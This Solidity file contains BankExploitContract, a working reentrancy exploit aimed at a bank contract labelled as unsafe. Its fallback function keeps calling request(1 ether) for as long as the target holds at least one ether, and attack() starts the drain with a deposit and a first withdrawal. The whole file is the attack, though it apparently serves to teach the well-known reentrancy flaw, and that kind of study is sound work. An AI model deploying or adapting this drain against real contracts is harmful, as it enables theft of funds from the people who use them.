// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;

interface IUnsafeBankContract {
  function request(uint _value) external;
  function deposit() external payable;
}

contract BankExploitContract {
  IUnsafeBankContract public unsafeBankContract;

  constructor(address _unsafeBankContractAddress) {
      unsafeBankContract = IUnsafeBankContract(_unsafeBankContractAddress);
  }

  // Fallback is called when DepositFunds sends Ether to this contract.
  fallback() external payable {
      if (address(unsafeBankContract).balance >= 1 ether) {
          unsafeBankContract.request(1 ether);
      }
  }

  function attack() external payable {
      require(msg.value >= 1 ether);
      unsafeBankContract.deposit{value: 1 ether}();
      unsafeBankContract.request(1 ether);
  }
}
